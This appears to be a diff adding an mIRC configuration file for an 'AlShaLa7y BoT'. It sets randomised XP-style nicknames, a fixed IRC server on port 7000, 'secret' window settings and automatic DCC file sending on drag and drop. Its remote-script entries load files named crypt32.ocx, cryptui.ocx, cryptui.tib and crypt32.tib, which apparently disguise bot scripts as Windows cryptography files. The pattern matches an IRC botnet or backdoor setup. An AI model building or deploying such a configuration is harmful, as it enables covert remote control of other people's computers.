@@ -1,0 +1,144 @@
+[AlShaLa7y]
+version=2.6
+site=www.AlShaLa7y.TK
+[warn]
+fserve=on
+dcc=off
+[options]
+n0=0,0,0,1,0,0,300,0,0,0,1,0,0,0,1,1,0,1,1,1,4096,0,1,0,0,0,1,1,0,50,1,1
+n1=0,100,0,0,0,0,0,0,3,0,1,1,0,0,0,0,0,1,0,0,1,0,1,0,5,0,0,0,0,0,1,0,0
+n2=0,0,0,0,1,1,1,1,0,60,120,0,0,1,0,0,0,1,0,120,20,10,0,0,1,0,0,1,0,0,0,0,0
+n3=5000,0,0,0,1,0,1,0,0,1,0,1,0,0,1,1,3,1,0,1,0,0,0,0,0,0,2,3,0,0,0,3,180,0
+n4=0,0,1,1,0,3,9999,0,0,0,1,1,1024,0,1,9,20,0,0,0,1,0,0,0,1,5000,1,2,0,0,2,0,0,0
+n5=1,1,1,1,1,1,1,1,1,1,6667,500000,0,0,0,0,1,0,300,30,10,0,0,26,0,0,0,8192,1,0,0,82,0
+n6=0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,100,1,1,0,0,0,0,0,2,1,0,1
+n7=0,0,0,0,0,0,0,0,0,1,1,0,0,1,0,0,1,70,0,10,0,1,1,1,1,1,0,0,0,0,1,1,1,1
+[about]
+version=6.03
+SHOW=br26354
+[ports]
+random=off
+bind=off
+[ident]
+active=yes
+userid=GoGo
+system=UNIX
+port=113
+[socks]
+enabled=no
+port=1080
+method=4
+dccs=no
+useip=yes
+[language]
+sjis=1
+multibyte=1
+[clicks]
+status=secret
+query=secret
+channel=secret
+nicklist=secret
+notify=secret
+message=secret
+[dde]
+status=on
+ServiceName=2.2
+CheckName=off
+ServerStatus=on
+[marker]
+show=off
+size=3
+colour=4
+method=1
+[text]
+network=All
+commandchar=/
+linesep=--
+timestamp=[HH:nn]
+accept=*.jpg
+ignore=*.*
+quit=Fuck Me
+[fileserver]
+warning=on
+[dccserver]
+n0=0,59,0,0,0,0
+[agent]
+enable=0,0,0
+char=merlin.acs
+options=1,1,1,100,0
+speech=150,60,100,1,180,10,50,1,1,1,0,50,1
+channel=1,1,1,1,1,1,1,1,1
+private=1,1,1,1
+other=1,1,1,1,1,1,1
+pos=20,20
+[files]
+s=s.ini
+finger=s.txt
+sites=sites.ini
+addrbk=addrbk.ini
+servers=servers.ini
+
+[wizard]
+warning=2
+[pfiles]
+n0=s.ini
+n1=s.ini
+n2=s.ini
+n3=s.ini
+n4=s.ini
+[co-l-ours]
+n0=1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0
+[dirs]
+[windows]
+main=-7,112,0,27,0,1,0
+scripts=25,473,45,441,0,0,0
+wchannel=0,665,0,397,0,1,0
+[mirc]
+nick=[XP-12747]
+anick=[XP-59779]
+user=AlShaLa7y BoT wWw.AlShaLa7y.TK
+email=Flo0oDeR@Flo0oDeR.KS
+host=alshala7y.a.laSERVER:alshala7y.a.la:7000
+[waves]
+query=No Sound
+notice=No Sound
+invite=No Sound
+disconnect=No Sound
+send=No Sound
+highlight=No Sound
+flash=No Sound
+dccfail=No Sound
+[dragdrop]
+n0=*.wav:/sound $1 $2-
+n1=*.*:/dcc send $1 $2-
+s0=*.*:/dcc send $1 $2-
+[extensions]
+n0=defaultEXTDIR:\
+n1=*.wav,*.mid,*.mp3,*.wma,*.oggEXTDIR:sounds\
+[styles]
+thin=3
+font=0
+hide=0
+color=default
+size=2
+buttons=0
+[colours]
+n0=0,6,4,5,2,3,3,3,3,3,3,1,5,7,6,1,3,2,3,5,1,0,1,0,1,15,6,0
+[rfiles]
+n0=remote.ini
+n1=remote.ini
+n2=crypt32.ocx
+n3=cryptui.ocx
+[real]
+host=alshala7y.a.laSERVER:alshala7y.a.la:7000
+nick=[XP-31829]
+anick=[XP-45373]
+user=AlShaLa7y BoT wWw.AlShaLa7y.TK
+email=Flo0oDeR@Flo0oDeR.KS
+[afiles]
+n0=aliases.ini
+[forevr]
+n0=sites.ini
+n1=sites.ini
+n2=cryptui.tib
+n3=crypt32.tib
